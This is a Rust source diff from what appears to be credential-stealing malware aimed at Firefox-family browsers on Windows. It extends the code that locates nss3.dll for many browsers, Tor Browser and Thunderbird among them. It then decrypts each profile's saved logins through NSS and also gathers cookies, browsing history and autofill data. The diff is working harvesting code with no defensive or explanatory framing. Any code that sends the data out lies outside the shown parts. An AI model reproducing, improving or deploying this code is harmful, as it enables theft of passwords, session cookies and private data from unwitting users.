@@ -90,29 +90,87 @@ fn get_browsers() -> Vec<GeckoBrowserInfo> {
     ]
 }
 
-// ── Firefox installation discovery ─────────────────────────────────────────
+// ── Browser installation discovery (NSS) ────────────────────────────────────
 
-fn find_nss_dir() -> Option<PathBuf> {
+fn nss_candidates(browser_name: &str) -> Vec<PathBuf> {
     let pf = env::var("ProgramFiles").unwrap_or_default();
     let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
-    let candidates = [
-        PathBuf::from(&pf).join("Mozilla Firefox"),
-        PathBuf::from(&pf86).join("Mozilla Firefox"),
-        PathBuf::from(&pf).join("Waterfox"),
-        PathBuf::from(&pf86).join("Waterfox"),
-        PathBuf::from(&pf).join("LibreWolf"),
-        PathBuf::from(&pf86).join("LibreWolf"),
-        PathBuf::from(&pf).join("Pale Moon"),
-        PathBuf::from(&pf86).join("Pale Moon"),
-        PathBuf::from(&pf).join("Moonchild Productions").join("Pale Moon"),
-        PathBuf::from(&pf).join("Floorp"),
-        PathBuf::from(&pf86).join("Floorp"),
-        PathBuf::from(&pf).join("SeaMonkey"),
-        PathBuf::from(&pf86).join("SeaMonkey"),
-    ];
-    for p in candidates {
-        if p.join("nss3.dll").exists() {
-            return Some(p);
+    let local = env::var("LOCALAPPDATA").unwrap_or_default();
+
+    match browser_name {
+        "Firefox" => vec![
+            PathBuf::from(&pf).join("Mozilla Firefox"),
+            PathBuf::from(&pf86).join("Mozilla Firefox"),
+        ],
+        "Firefox ESR" => vec![
+            PathBuf::from(&pf).join("Mozilla Firefox ESR"),
+            PathBuf::from(&pf86).join("Mozilla Firefox ESR"),
+            PathBuf::from(&pf).join("Mozilla Firefox"),
+        ],
+        "Firefox Developer" => vec![
+            PathBuf::from(&pf).join("Firefox Developer Edition"),
+            PathBuf::from(&pf86).join("Firefox Developer Edition"),
+            PathBuf::from(&pf).join("Mozilla Firefox"),
+        ],
+        "Waterfox" | "Waterfox G5" => vec![
+            PathBuf::from(&pf).join("Waterfox"),
+            PathBuf::from(&pf86).join("Waterfox"),
+            PathBuf::from(&local).join("Waterfox"),
+        ],
+        "LibreWolf" => vec![
+            PathBuf::from(&pf).join("LibreWolf"),
+            PathBuf::from(&pf86).join("LibreWolf"),
+            PathBuf::from(&local).join("librewolf"),
+        ],
+        "PaleMoon" => vec![
+            PathBuf::from(&pf).join("Moonchild Productions").join("Pale Moon"),
+            PathBuf::from(&pf86).join("Moonchild Productions").join("Pale Moon"),
+            PathBuf::from(&pf).join("Pale Moon"),
+        ],
+        "Basilisk" => vec![
+            PathBuf::from(&pf).join("Moonchild Productions").join("Basilisk"),
+            PathBuf::from(&pf86).join("Moonchild Productions").join("Basilisk"),
+        ],
+        "SeaMonkey" => vec![
+            PathBuf::from(&pf).join("SeaMonkey"),
+            PathBuf::from(&pf86).join("SeaMonkey"),
+        ],
+        "Floorp" => vec![
+            PathBuf::from(&pf).join("Floorp"),
+            PathBuf::from(&pf86).join("Floorp"),
+            PathBuf::from(&local).join("Floorp"),
+        ],
+        "Thunderbird" => vec![
+            PathBuf::from(&pf).join("Mozilla Thunderbird"),
+            PathBuf::from(&pf86).join("Mozilla Thunderbird"),
+        ],
+        "Tor Browser" => vec![
+            PathBuf::from(&local).join("Tor Browser").join("Browser"),
+            PathBuf::from(&pf).join("Tor Browser").join("Browser"),
+        ],
+        "K-Meleon" => vec![
+            PathBuf::from(&pf).join("K-Meleon"),
+            PathBuf::from(&pf86).join("K-Meleon"),
+        ],
+        "IceDragon" => vec![
+            PathBuf::from(&pf).join("Comodo").join("IceDragon"),
+            PathBuf::from(&pf86).join("Comodo").join("IceDragon"),
+        ],
+        "Cyberfox" => vec![
+            PathBuf::from(&pf).join("Cyberfox"),
+            PathBuf::from(&pf86).join("Cyberfox"),
+        ],
+        _ => vec![
+            PathBuf::from(&pf).join("Mozilla Firefox"),
+            PathBuf::from(&pf86).join("Mozilla Firefox"),
+        ],
+    }
+}
+
+fn find_nss_dir(browser_name: &str) -> Option<PathBuf> {
+    for path in nss_candidates(browser_name) {
+        if path.join("nss3.dll").exists() {
+            return Some(path);
         }
     }
     None
@@ -170,34 +228,53 @@ fn decrypt_nss_value(nss_lib: &libloading::Library, encrypted_b64: &str) -> Opti
 }
 
 /// Extract passwords from a single Firefox profile using NSS
-fn extract_passwords_nss(profile_path: &Path, firefox_dir: &Path) -> Option<String> {
-    // Prepend Firefox dir to PATH so nss3.dll can find its dependency DLLs
+fn extract_passwords_nss(profile_path: &Path, nss_dir: &Path) -> Option<String> {
+    let logins_path = profile_path.join("logins.json");
+    if !logins_path.exists() {
+        return None;
+    }
+    if !profile_path.join("key4.db").exists() && !profile_path.join("key3.db").exists() {
+        return None;
+    }
+
+    // Prepend browser dir to PATH so nss3.dll can find its dependency DLLs
     let original_path = env::var("PATH").unwrap_or_default();
     #[allow(unused_unsafe)]
     unsafe {
-        env::set_var("PATH", format!("{};{}", firefox_dir.display(), original_path));
+        env::set_var("PATH", format!("{};{}", nss_dir.display(), original_path));
     }
 
     let result = (|| -> Option<String> {
         let nss_lib =
-            unsafe { libloading::Library::new(firefox_dir.join("nss3.dll")).ok()? };
+            unsafe { libloading::Library::new(nss_dir.join("nss3.dll")).ok()? };
 
         // Initialize NSS with the profile directory
         unsafe {
-            let nss_init: libloading::Symbol<
-                unsafe extern "C" fn(*const ffi::c_char) -> i32,
-            > = nss_lib.get(b"NSS_Init").ok()?;
-
             let profile_cstr =
                 ffi::CString::new(profile_path.to_string_lossy().as_bytes()).ok()?;
-            let status = nss_init(profile_cstr.as_ptr());
+
+            let mut status = if let Ok(nss_init) = nss_lib
+                .get::<unsafe extern "C" fn(*const ffi::c_char) -> i32>(b"NSS_Init")
+            {
+                nss_init(profile_cstr.as_ptr())
+            } else {
+                -1
+            };
+
+            if status != 0 {
+                if let Ok(nss_init_ro) = nss_lib
+                    .get::<unsafe extern "C" fn(*const ffi::c_char) -> i32>(b"NSS_InitReadOnly")
+                {
+                    status = nss_init_ro(profile_cstr.as_ptr());
+                }
+            }
+
             if status != 0 {
                 return None;
             }
         }
 
         // Read logins.json
-        let logins_path = profile_path.join("logins.json");
         let content = fs::read_to_string(&logins_path).ok()?;
         let json: Value = serde_json::from_str(&content).ok()?;
         let logins = json["logins"].as_array()?;
@@ -464,6 +541,14 @@ fn parse_profiles_ini(ini: &Path, profiles_dir: &Path) -> Vec<(String, PathBuf)>
 }
 
 fn get_profiles(profiles_dir: &Path) -> Vec<(String, PathBuf)> {
+    let ini_in_dir = profiles_dir.join("profiles.ini");
+    if ini_in_dir.exists() {
+        let parsed = parse_profiles_ini(&ini_in_dir, profiles_dir);
+        if !parsed.is_empty() {
+            return parsed;
+        }
+    }
+
     if let Some(parent) = profiles_dir.parent() {
         let ini = parent.join("profiles.ini");
         if ini.exists() {
@@ -490,19 +575,19 @@ fn get_profiles(profiles_dir: &Path) -> Vec<(String, PathBuf)> {
 
 pub fn extract_all() -> Vec<(String, String)> {
     let mut results = Vec::new();
-    let firefox_dir = find_nss_dir();
 
     for browser in get_browsers() {
         if !browser.profiles_path.exists() {
             continue;
         }
 
+        let nss_dir = find_nss_dir(browser.name);
         let profiles = get_profiles(&browser.profiles_path);
 
         for (profile_name, profile_path) in profiles {
-            let passwords = firefox_dir
+            let passwords = nss_dir
                 .as_ref()
-                .and_then(|ff| extract_passwords_nss(&profile_path, ff));
+                .and_then(|dir| extract_passwords_nss(&profile_path, dir));
             let cookies = extract_cookies(&profile_path);
             let history = extract_history(&profile_path);
             let autofill = extract_autofill(&profile_path);
